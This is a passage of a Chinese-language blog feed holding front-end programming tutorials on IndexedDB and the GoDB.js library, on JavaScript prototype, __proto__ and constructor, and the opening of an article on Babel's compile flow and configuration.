有一个版本（version）的概念，连接数据库时就可以指定版本</p><pre><code>const version = 1;const request = window.indexedDB.open(&#39;pku&#39;, version);</code></pre><p>版本主要用来控制数据库的结构，当数据库结构（表结构）发生变化时，版本也会变化</p><p>如上，<code>request</code> 上有四个事件：</p><ul><li><p><code>onupgradeneeded</code> 在版本改变时触发</p></li><li><ul><li>注意首次连接数据库时，版本从 0 变成 1，因此也会触发，且先于 <code>onsuccess</code></li></ul></li><li><p><code>onsuccess</code> 在连接成功后触发</p></li><li><p><code>onerror</code> 在连接失败时触发</p></li><li><p><code>onblocked</code> 在连接被阻止的时候触发，比如打开版本低于当前存在的版本</p></li></ul><p>注意这四个事件都是异步的，意味着在连接 IndexedDB 的请求发出去后，需要过一段时间才能连上数据库，并进行操作</p><p>开发者对数据库的所有操作，都得放在异步连上数据库之后，这有的时候会带来很大的不便</p><p>而开发者如果想创建数据表（在 IndexedDB 里面叫做 ObjectStore），只能将其放到 <code>onupgradeneeded</code> 事件中（官方的定义是需要一个 <code>IDBVersionChange</code> 的事件）</p><pre class="line-numbers language-js"><code class="language-js">request<span class="token punctuation">.</span>onupgradeneeded <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>    db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>db<span class="token punctuation">.</span>objectStoreNames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            keyPath<span class="token punctuation">:</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 主键</span>            autoIncrement<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">// 自增</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这段代码，在数据库初始化时，创建了一个 <code>student</code> 的表，并且以 <code>id</code> 为自增主键（每加一条数据，主键会自动增长，无需开发者指定）</p><p>在这一切做好以后，终于，我们可以连接数据库，然后添加数据了</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> adding <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 创建事务</span>  <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定 student 表</span>  <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'luke'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">22</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>adding<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'write success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>adding<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'write failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用同样的方法再加一条数据</p><pre><code>db.transaction(&#39;student&#39;, &#39;readwrite&#39;)  .objectStore(&#39;student&#39;)  .add({ name: &#39;elaine&#39;, age: 23 });</code></pre><p>然后，打开浏览器的开发者工具，我们就能看到添加的数据：  <img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth2kbvrej30is0380st.jpg" alt="图片">  </p><p>这里可以看到 IndexedDB 的 key-value 储存特性，key 就是主键（这里指定主键为 <code>id</code>），value 就是剩下的字段和对应的数据</p><p>这个 key-value 结构对应的 Table 结构如下：  </p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth2yd01fj30nf036jra.jpg" alt="图片">  </p><p>如果要获取数据，需要一个 <code>readonly</code> 的 Transaction</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> request <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取 id 为 2 的数据</span>request<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// { id: 2, name: 'elaine', age: 23 }</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>综上，哪怕只是想简单的往 IndexedDB 里增加和查询数据，都需要写一大堆代码，操作非常繁琐，一不小心还容易掉坑里</p><p>那么，有没有什么办法，能更优雅的使用 IndexedDB，在代码量减少的情况下，还能更好的发挥其实力呢？</p><h2 id="GoDB-js"><a href="#GoDB-js" class="headerlink" title="GoDB.js"></a>GoDB.js</h2><p><code>GoDB.js</code> 是一个基于 IndexedDB 实现前端本地储存的类库</p><p>帮你做到代码更简洁的同时，更好的发挥 IndexedDB 的实力</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth3onip5j30u00bjjs0.jpg" alt="图片"></p><p>首先安装：</p><pre><code>npm install godb</code></pre><p>对 IndexedDB 的增删改查，一行代码就可以搞定！</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> GoDB <span class="token keyword">from</span> <span class="token string">'godb'</span><span class="token punctuation">;</span><span class="token keyword">const</span> testDB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GoDB</span><span class="token punctuation">(</span><span class="token string">'testDB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 连接数据库</span><span class="token keyword">const</span> user <span class="token operator">=</span> testDB<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取数据表</span><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'luke'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">22</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 随便定义一个对象</span>user<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 增</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>luke <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>luke<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 查</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>luke <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token operator">...</span>luke<span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">23</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 改</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>luke <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token keyword">delete</span><span class="token punctuation">(</span>luke<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 删</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者，一次性添加许多数据，然后看看效果：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'luke'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">22</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'elaine'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">23</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>user<span class="token punctuation">.</span><span class="token function">addMany</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token function">consoleTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这段代码，会在添加数据后，在控制台中展示出 <code>user</code> 表的内容：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth3xx3m1j30u0034weh.jpg" alt="图片"></p><p>回到之前 LocalStorage 出问题的那个例子，用 <code>GoDB</code> 就可以实现正常储存：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> GoDB <span class="token keyword">from</span> <span class="token string">'godb'</span><span class="token punctuation">;</span><span class="token keyword">const</span> testDB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GoDB</span><span class="token punctuation">(</span><span class="token string">'testDB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 连接数据库</span><span class="token keyword">const</span> store <span class="token operator">=</span> testDB<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'store'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取数据表</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    a<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>    b<span class="token punctuation">:</span> <span class="token regex">/abc/</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>store<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> store<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 获取存进去的实例</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// {</span><span class="token comment" spellcheck="true">//     id: 1,</span><span class="token comment" spellcheck="true">//     a: undefined,</span><span class="token comment" spellcheck="true">//     b: /abc/,</span><span class="token comment" spellcheck="true">//     c: new Date()</span><span class="token comment" spellcheck="true">// }</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并且，循环引用的对象也能使用 <code>GoDB</code> 进行储存</p><pre><code>const a = { key: &#39;value&#39; };a[&#39;a&#39;] = a;store.add(a)  .then(item =&gt; store.get(item.id)) // 获取存进去的实例  .then(result =&gt; console.log(result));// 打印出来的对象比 a 多了个 id，其它完全一致</code></pre><p>关于 <code>GoDB</code> 更详细的用法，可以参考 <code>GoDB</code> 的项目官网（不断完善中）：</p><p><a href="https://godb-js.github.io/" target="_blank" rel="noopener">https://godb-js.github.io/</a></p><p>总之，<code>GoDB</code> 可以</p><ul><li><p>帮你在背后处理好 IndexedDB 各种繁琐操作</p></li><li><p>帮你在背后维护好数据库、数据表和字段</p></li><li><ul><li>以及字段的索引，各种属性（比如 <code>unique</code>）</li></ul></li><li><p>帮你规范化 IndexedDB 的使用，使你的项目更易维护</p></li><li><p>最终，开放几个简单易用的 API 给你，让你用简洁的代码玩转 IndexedDB</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下三大方案各自的特点以及适用场景：</p><ul><li><p>Cookie</p></li><li><ul><li>能被服务器指定，浏览器会自动在请求中带上</li><li>大小只有 4kb</li><li>大规模应用于广告商定位用户</li><li>配合 session 也是一个可行的登录鉴权方案</li></ul></li><li><p>Web Storage</p></li><li><ul><li>大小有 10MB，使用极其简单</li><li>但是只能存字符串，需要转义才能存 JS 对象</li><li>大部分情况下能完全替代 Cookie，且更安全</li><li>配合 token 可以实现更安全的登录鉴权</li></ul></li><li><p>IndexedDB</p></li><li><ul><li>储存空间无上限，功能极其强大</li><li>原生支持 JS 对象，能更好的储存数据</li><li>以数据库的形式储存数据，数据管理更规范</li><li>但是，原生 API 操作很繁琐，且有一定使用门槛</li></ul></li></ul><p>我个人是非常看好 IndexedDB 的，我认为在前端越来越复杂的未来，在下一个十年各种重前端应用（在线文档，各种 SaaS 应用），以及 Electron 环境中，IndexedDB 一定能够大放光彩</p><ul><li>比如缓存接口数据，实现更好的用户体验</li><li>比如在线文档（富文本编辑器）保存编辑历史</li><li>比如任何需要在前端保存大量数据的应用</li></ul><p>总之，IndexedDB 可以说是最适合用来在前端存数据的方案，只不过因为其繁琐的操作和一定的使用门槛，在目前没有更简单的 localStorage 使用范围那么广而已</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cookie </tag>
            
            <tag> Storage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS 中的 prototype、__proto__与constructor（图解）</title>
      <link href="2021/04/27/JS%E4%B8%AD%E7%9A%84prototype%E3%80%81__proto__%E4%B8%8Econstructor%EF%BC%88%E5%9B%BE%E8%A7%A3%EF%BC%89/"/>
      <url>2021/04/27/JS%E4%B8%AD%E7%9A%84prototype%E3%80%81__proto__%E4%B8%8Econstructor%EF%BC%88%E5%9B%BE%E8%A7%A3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>作为一名前端工程师，必须搞懂JS中的<code>prototype</code>、<code>__proto__</code>与<code>constructor</code>属性，相信很多初学者对这些属性存在许多困惑，容易把它们混淆，本文旨在帮助大家理清它们之间的关系并彻底搞懂它们。这里说明一点，<code>__proto__</code>属性的两边是各由两个下划线构成（这里为了方便大家看清，在两下划线之间加入了一个空格：<code>_ _proto_ _</code>，读作“<strong>dunder proto</strong>”，“<strong>double underscore proto</strong>”的缩写），实际上，该属性在ES标准定义中的名字应该是<code>[[Prototype]]</code>，具体实现是由浏览器代理自己实现，谷歌浏览器的实现就是将<code>[[Prototype]]</code>命名为<code>__proto__</code>，大家清楚这个标准定义与具体实现的区别即可（名字有所差异，功能是一样的），可以通过该方式检测引擎是否支持这个属性：<code>Object.getPrototypeOf({__proto__: null}) === null</code>。本文基于谷歌浏览器（版本 72.0.3626.121）的实验结果所得。</p><p>现在正式开始！ 让我们从如下一个简单的例子展开讨论，并配以相关的图帮助理解：</p><pre><code>function Foo() {...};let f1 = new Foo();</code></pre><p>以上代码表示创建一个构造函数<code>Foo()</code>，并用<code>new</code>关键字实例化该构造函数得到一个实例化对象<code>f1</code>。这里稍微补充一下new操作符将函数作为构造器进行调用时的过程：函数被调用，然后新创建一个对象，并且成了函数的上下文（也就是此时函数内部的this是指向该新创建的对象，这意味着我们可以在构造器函数内部通过this参数初始化值），最后返回该新对象的引用，详细请看：详解JavaScript中的new操作符。虽然是简简单单的两行代码，然而它们背后的关系却是错综复杂的，如下图所示：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptfxj4zuzj30u00gun0l.jpg" alt="图片">看到这图<strong>别怕</strong>，让我们一步步剖析，彻底搞懂它们！</p><p><strong>图的说明</strong>：右下角为图例，红色箭头表示<code>__proto__</code>属性指向、绿色箭头表示<code>prototype</code>属性的指向、棕色实线箭头表示本身具有的<code>constructor</code>属性的指向，棕色虚线箭头表示继承而来的<code>constructor</code>属性的指向；蓝色方块表示对象，浅绿色方块表示函数（这里为了更好看清，Foo()仅代表是函数，并不是指执行函数Foo后得到的结果，图中的其他函数同理）。图的中间部分即为它们之间的联系，图的最左边即为例子代码。</p><h1 id="2-proto-属性"><a href="#2-proto-属性" class="headerlink" title="2. _ _ proto _ _ 属性"></a>2. _ _ proto _ _ 属性</h1><p>首先，我们需要牢记两点：①<code>__proto__</code>和<code>constructor</code>属性是<strong>对象</strong>所独有的；② <code>prototype</code>属性是<strong>函数</strong>所独有的。但是由于JS中函数也是一种对象，所以函数也拥有<code>__proto__</code>和<code>constructor</code>属性，这点是致使我们产生困惑的很大原因之一。上图有点复杂，我们把它按照属性分别拆开，然后进行分析：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptfx44wsgj30u00fyjtk.jpg" alt="图片"><br>  第一，这里我们仅留下 <strong><code>__proto__</code></strong> 属性，它是<strong>对象所独有的</strong>，可以看到<code>__proto__</code>属性都是由<strong>一个对象指向一个对象</strong>，即指向它们的原型对象（也可以理解为父对象），那么这个属性的作用是什么呢？它的<strong>作用</strong>就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的<code>__proto__</code>属性所指向的那个对象（可以理解为父对象）里找，如果父对象也不存在这个属性，则继续往父对象的<code>__proto__</code>属性所指向的那个对象（可以理解为爷爷对象）里找，如果还没找到，则继续往上找…直到原型链顶端<strong>null</strong>（可以理解为原始人。。。），再往上找就相当于在null上取值，会报错（可以理解为，再往上就已经不是“人”的范畴了，找不到了，到此结束，<code>null</code>为原型链的终点），由以上这种通过<code>__proto__</code>属性来连接对象直到<code>null</code>的一条链即为我们所谓的<strong>原型链</strong>。</p><p>其实我们平时调用的字符串方法、数组方法、对象方法、函数方法等都是靠<code>__proto__</code>继承而来的。</p><h1 id="3-prototype属性"><a href="#3-prototype属性" class="headerlink" title="3. prototype属性"></a>3. prototype属性</h1><p>第二，接下来我们看 <strong><code>prototype</code></strong> 属性：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptfx5wymej30u00fm0ul.jpg" alt="图片">  <code>prototype</code>属性，别忘了一点，就是我们前面提到要牢记的两点中的第二点，它是<strong>函数所独有的</strong>，它是从<strong>一个函数指向一个对象</strong>。它的含义是<strong>函数的原型对象</strong>，也就是这个函数（其实所有函数都可以作为构造函数）所创建的实例的原型对象，由此可知：<code>f1.__proto__ === Foo.prototype</code>，它们两个完全一样。那<code>prototype</code>属性的作用又是什么呢？它的<strong>作用</strong>就是包含可以由特定类型的所有实例共享的属性和方法，也就是让该函数所实例化的对象们都可以找到公用的属性和方法。<strong>任何函数在创建的时候，其实会默认同时创建该函数的prototype对象。</strong></p><h1 id="4-constructor属性"><a href="#4-constructor属性" class="headerlink" title="4. constructor属性"></a>4. constructor属性</h1><p>最后，我们来看一下 <strong><code>constructor</code></strong> 属性：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptfx4ytnwj30u00gc0uy.jpg" alt="图片">  <code>constructor</code>属性也是<strong>对象才拥有的</strong>，它是从<strong>一个对象指向一个函数</strong>，含义就是<strong>指向该对象的构造函数</strong>，每个对象都有构造函数（本身拥有或继承而来，继承而来的要结合<code>__proto__</code>属性查看会更清楚点，如下图所示），从上图中可以看出<strong>Function</strong>这个对象比较特殊，它的构造函数就是它自己（因为Function可以看成是一个函数，也可以是一个对象），所有函数和对象最终都是由Function构造函数得来，所以<code>constructor</code>属性的终点就是<strong>Function</strong>这个函数。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptfx4gq93j30u00gi77d.jpg" alt="图片"><br>  感谢网友的指出，这里解释一下上段中<strong>“每个对象都有构造函数”</strong>这句话。这里的意思是每个对象都可以找到其对应的constructor，因为创建对象的前提是需要有constructor，而这个constructor可能是对象自己本身显式定义的或者通过<code>__proto__</code>在原型链中找到的。<strong>而单从constructor这个属性来讲，只有prototype对象才有</strong>。每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象，而<code>函数创建的对象.__proto__ === 该函数.prototype，该函数.prototype.constructor===该函数本身</code>，故通过函数创建的对象即使自己没有constructor属性，它也能通过<code>__proto__</code>找到对应的constructor，所以任何对象最终都可以找到其构造函数（null如果当成对象的话，将null除外）。如下：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptfx5h2e5j30sw0gr0uc.jpg" alt="图片"></p><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h1><p><strong>总结一下：</strong></p><ol><li>我们需要牢记两点：①<code>__proto__</code>和<code>constructor</code>属性是<strong>对象</strong>所独有的；② <code>prototype</code>属性是<strong>函数</strong>所独有的，因为函数也是一种对象，所以函数也拥有<code>__proto__</code>和<code>constructor</code>属性。</li><li><code>__proto__</code>属性的<strong>作用</strong>就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的<code>__proto__</code>属性所指向的那个对象（父对象）里找，一直找，直到<code>__proto__</code>属性的终点<strong>null</strong>，再往上找就相当于在null上取值，会报错。通过<code>__proto__</code>属性将对象连接起来的这条链路即<strong>我们所谓的原型链</strong>。</li><li><code>prototype</code>属性的<strong>作用</strong>就是让该函数所实例化的对象们都可以找到公用的属性和方法，即<code>f1.__proto__ === Foo.prototype</code>。</li><li><code>constructor</code>属性的含义就是<strong>指向该对象的构造函数</strong>，所有函数（此时看成对象了）最终的构造函数都指向<strong>Function</strong>。</li></ol><p>本文就此结束了，希望对那些对JS中的<code>prototype</code>、<code>__proto__</code>与<code>constructor</code>属性有困惑的同学有所帮助。</p><p><strong>小彩蛋：实现继承（相对完美、优雅）</strong></p><pre><code>function inherit(Child, Parent) {     // 继承原型上的属性     Child.prototype = Object.create(Parent.prototype)     // 修复 constructor    Child.prototype.constructor = Child    // 存储超类    Child.super = Parent    // 静态属性继承    if (Object.setPrototypeOf) {        // setPrototypeOf es6        Object.setPrototypeOf(Child, Parent)    } else if (Child.__proto__) {        // __proto__ es6 引入，但是部分浏览器早已支持        Child.__proto__ = Parent    } else {        // 兼容 IE10 等陈旧浏览器        // 将 Parent 上的静态属性和方法拷贝一份到 Child 上，不会覆盖 Child 上的方法        for (var k in Parent) {            if (Parent.hasOwnProperty(k) &amp;&amp; !(k in Child)) {                Child[k] = Parent[k]            }        }    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babel编译流程及特性</title>
      <link href="2021/04/25/babel%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B%E5%8F%8A%E7%89%B9%E6%80%A7/"/>
      <url>2021/04/25/babel%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B%E5%8F%8A%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Babel 是一个强大的 js 编译器。有了 Babel， 我们可以放肆的使用 js 的新特性，而不用考虑浏览器兼容性问题。不仅如此，基于 babel 体系，我们可以通过插件的方法修改一些语法，优化一些语法，甚至创建新的语法。</p><p>那么，如此强大且灵活的特性是如何实现的？我们从头开始，了解下 Babel 的编译流程。</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpvz858w1tj30wj0u0n57.jpg" alt="babel流程 (1)">  </p><h2 id="babel生成配置"><a href="#babel生成配置" class="headerlink" title="babel生成配置"></a>babel生成配置</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpvzv9gmmmj31d00i6dpd.jpg" alt="image-20210425145412812"></p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>项目配置文件</p><pre class="line-numbers language-json"><code class="language-json"><span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"@babel/cli"</span><span class="token operator">:</span> <span class="token string">"7.10.5"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/core"</span><span class="token operator">:</span> <span class="token string">"7.11.1"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-proposal-class-properties"</span><span class="token operator">:</span> <span class="token string">"7.10.4"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-proposal-decorators"</span><span class="token operator">:</span> <span class="token string">"7.10.5"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-proposal-do-expressions"</span><span class="token operator">:</span> <span class="token string">"7.10.4"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-proposal-object-rest-spread"</span><span class="token operator">:</span> <span class="token string">"7.11.0"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-syntax-dynamic-import"</span><span class="token operator">:</span> <span class="token string">"7.8.3"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-transform-react-jsx"</span><span class="token operator">:</span> <span class="token string">"7.12.17"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/plugin-transform-runtime"</span><span class="token operator">:</span> <span class="token string">"7.11.0"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/preset-env"</span><span class="token operator">:</span> <span class="token string">"7.11.0"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/preset-react"</span><span class="token operator">:</span> <span class="token string">"7.12.13"</span><span class="token punctuation">,</span>    <span class="token property">"@babel/preset-typescript"</span><span class="token operator">:</span> <span class="token string">"7.12.17"</span><span class="token punctuation">,</span>      .......<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们常接触到的有<strong>babel</strong>、<strong>babel-loader</strong>、<strong>@babel/core</strong>、<strong>@babel/preset-env</strong> 、<strong>@babel/polyfill</strong>、以及<strong>@babel/plugin-transform-runtime</strong>，这些都是做什么的？</p><h4 id="1、babel："><a href="#1、babel：" class="headerlink" title="1、babel："></a><strong>1、babel：</strong></h4><p>babel官网对其做了非常明了的定义：</p><blockquote><p>Babel 是一个工具链，主要用于在旧的浏览器或环境中将 ECMAScript 2015+ 代码转换为向后兼容版本的 JavaScript 代码：<br>转换语法<br>Polyfill 实现目标环境中缺少的功能 (通过 <a href="https://link.zhihu.com/?target=https%3A//babel.docschina.org/docs/en/babel-polyfill" target="_blank" rel="noopener">@babel/polyfill</a>)<br>源代码转换 (codemods)<br>更多！</p></blockquote><p>我们可以看到，babel是一个包含语法转换等诸多功能的工具链，通过这个工具链的使用可以使低版本的浏览器兼容最新的javascript语法。</p><p>需要注意的是，babel也是一个可以安装的包，并且在 webpack 1.x 配置中使用它来作为 loader 的简写 。如：</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  test<span class="token operator">:</span> /\.js$/<span class="token punctuation">,</span>  loader<span class="token operator">:</span> 'babel'<span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是这种方式在webpack 2.x以后不再支持并得到错误提示：</p><p>The node API for<code>babel</code>has been moved to<code>babel-core</code></p><p>此时删掉 babel包，安装babel-loader, 并制定loader: ‘babel-loader’即可</p><h4 id="2、-babel-core："><a href="#2、-babel-core：" class="headerlink" title="2、@babel/core："></a><strong>2、@babel/core：</strong></h4><p>@babel/core 是整个 babel 的核心，它负责调度 babel 